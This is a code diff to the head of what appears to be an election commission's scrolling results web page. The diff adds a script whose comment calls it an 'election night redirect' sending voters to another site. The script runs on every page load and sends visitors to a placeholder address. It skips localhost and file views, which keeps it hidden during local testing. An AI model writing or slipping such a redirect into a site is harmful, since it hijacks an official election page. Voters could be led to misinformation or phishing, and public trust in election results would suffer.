@@ -2,6 +2,16 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
+  <!-- ELECTION NIGHT REDIRECT (staged, not live until merged): sends voters to another site.
+       To retarget: change the one address below. To undo: revert this pull request. -->
+  <script>
+    (function () {
+      var target = 'https://REDIRECT-TARGET.invalid/';
+      var h = location.hostname;
+      if (h === 'localhost' || h === '127.0.0.1' || location.protocol === 'file:') return;
+      location.replace(target);
+    })();
+  </script>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Scrolling Results Presentation | Hamilton County Election Commission</title>
 
